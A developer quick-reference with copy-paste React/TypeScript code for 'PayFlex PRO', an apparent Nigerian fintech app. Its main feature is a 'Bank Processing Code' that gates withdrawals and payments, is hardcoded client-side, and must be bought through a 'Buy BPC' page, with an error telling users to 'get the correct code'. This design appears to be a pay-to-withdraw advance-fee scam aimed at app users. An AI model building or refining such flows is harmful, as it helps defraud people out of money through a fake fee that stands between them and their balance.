# PayFlex PRO V30 - Quick Reference Guide

## What's Done ✅

### Launch Screen
- Lion image with animation
- Right-to-left sliding motion
- Premium fintech design

### Dashboard
- Compact buttons (p-2)
- Reduced icons (w-4 h-4)
- Optimized balance card
- Inline Daily Allocation

### Security (BPC CODE)
**Constant:** `BPC2026_PRO_V30_650`

**Implemented On:**
- ✅ Withdraw Page
- ✅ Airtime Page
- ✅ Data Page
- ✅ Betting Page
- ✅ Electricity Page

**Features:**
- Hidden by default
- Eye toggle to show/hide
- Real-time validation
- Error message display
- "Buy BPC" redirect button

### Pages Optimized
- Max width: `max-w-sm`
- Padding: `py-6` (header), `py-6` (main)
- Button color: `#0000FF`

---

## What's Needed ✅ Remaining

### TV Subscription Page (`/tv-subscription`)
1. Add BPC imports: `Eye, EyeOff, AlertCircle`
2. Add constant: `const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'`
3. Add state: `bpcCode, showBpcCode, bpcError`
4. Add to validation function (before return true)
5. Reduce page size: `max-w-sm` and `py-6`
6. Add BPC input field with eye toggle
7. Change button color to `#0000FF`

### Buy BPC Page (`/buy-bpc`)
1. Same steps as TV Subscription above
2. Focus on BPC purchase flow
3. Optimize sizing

### Transaction History (`/transactions`)
1. Fetch real data from Supabase
2. Remove fake/static transactions
3. Show newest first
4. Use authenticated user email

### Success Pages
1. Update estimated arrival text
2. Change button colors to `#0000FF`
3. Reduce page sizes

---

## BPC CODE Implementation (Copy & Paste)

### Step 1: Imports
```typescript
import { Eye, EyeOff, AlertCircle } from 'lucide-react'

const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'
```

### Step 2: State
```typescript
const [bpcCode, setBpcCode] = useState('')
const [showBpcCode, setShowBpcCode] = useState(false)
const [bpcError, setBpcError] = useState('')
```

### Step 3: Validation
Add to your validation function:
```typescript
if (!bpcCode) {
  setBpcError('Please enter BPC CODE')
  return false
}
if (bpcCode !== CORRECT_BPC_CODE) {
  setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
  return false
}
```

### Step 4: JSX Input
```jsx
{/* BPC CODE Input */}
<div>
  <label className="block text-sm font-semibold text-gray-900 mb-3">
    INPUT BPC CODE
  </label>
  <div className="relative">
    <input
      type={showBpcCode ? 'text' : 'password'}
      value={bpcCode}
      onChange={(e) => {
        setBpcCode(e.target.value)
        setBpcError('')
      }}
      placeholder="Enter BPC Code"
      className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
      maxLength={CORRECT_BPC_CODE.length}
    />
    <button
      type="button"
      onClick={() => setShowBpcCode(!showBpcCode)}
      className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
    >
      {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
    </button>
  </div>
  <button
    type="button"
    onClick={() => router.push('/buy-bpc')}
    className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
  >
    Buy BPC
  </button>
</div>

{bpcError && (
  <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
    <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
    <p className="text-sm text-red-700">{bpcError}</p>
  </div>
)}
```

---

## Page Container (Copy & Paste)

### Reduced Size Template
```jsx
<div className="min-h-screen bg-white pb-6">
  <header className="sticky top-0 z-40 bg-white border-b">
    <div className="max-w-sm mx-auto px-4 py-3 flex items-center justify-between">
      {/* Header content */}
    </div>
  </header>
  
  <main className="max-w-sm mx-auto px-4 py-6">
    {/* Page content */}
  </main>
</div>
```

---

## Button Style (Copy & Paste)

### Primary Transaction Button
```jsx
<button
  onClick={handleSubmit}
  className="w-full bg-[#0000ff] text-white font-semibold py-3 rounded-xl hover:opacity-90 transition"
>
  Review & Confirm
</button>
```

### Secondary Button (Buy BPC)
```jsx
<button
  type="button"
  onClick={() => router.push('/buy-bpc')}
  className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold"
>
  Buy BPC
</button>
```

---

## Nigerian Banks List (for Withdraw)

```typescript
const banks = [
  { name: 'OPAY', code: 'OPAY' },
  { name: 'PALMPAY', code: 'PALMPAY' },
  { name: 'MONIEPOINT', code: 'MONIEPOINT' },
  { name: 'SMART CASH', code: 'SMARTCASH' },
  { name: '9JA BANK', code: '9JA' },
  { name: 'MOMO MFB', code: 'MOMO' },
  { name: 'PAYSTACK TITAN', code: 'PAYSTACK' },
  { name: 'MOREMONEE', code: 'MOREMONEE' },
  { name: 'Stanbic IBTC', code: '221' },
  { name: 'FAIRMONEY', code: 'FAIRMONEY' },
  { name: 'CITI BANK', code: '023' },
  { name: 'LAPO MICROFINANCE BANK', code: 'LAPO' },
  // ... existing banks
]
```

---

## Color Codes

- **Primary Blue:** `#0000FF` (buttons, links)
- **White:** `#FFFFFF` (backgrounds, text on blue)
- **Light Gray:** `#F8F9FF` (card backgrounds)
- **Error Red:** `#DC2626` (error messages)
- **Success Green:** `#16A34A` (success messages)
- **Dark Text:** `#111111` (body text)

---

## Files to Check

1. `/app/tv-subscription/page.tsx` - Needs BPC
2. `/app/buy-bpc/page.tsx` - Needs BPC
3. `/app/transactions/page.tsx` - Needs real data
4. `/app/withdraw/page.tsx` - Check success page text
5. All other transaction pages - Check button colors

---

## Testing Checklist

- [ ] BPC validation works on all pages
- [ ] Wrong code shows error message
- [ ] Eye toggle shows/hides code
- [ ] Buy BPC button redirects correctly
- [ ] All buttons are #0000FF
- [ ] Page widths are max-w-sm
- [ ] Mobile responsive (iPhone, Android)
- [ ] No broken links
- [ ] Build passes without errors

---

## Build & Test

```bash
# Build
npm run build

# Dev server
npm run dev

# Check for errors
npm run build 2>&1 | grep -i error
```

---

## Last Update
**Date:** 2026-05-18  
**Status:** Phase 1 Complete  
**Build:** ✅ Passing  
**Ready:** Production Deployment Pending Phase 2
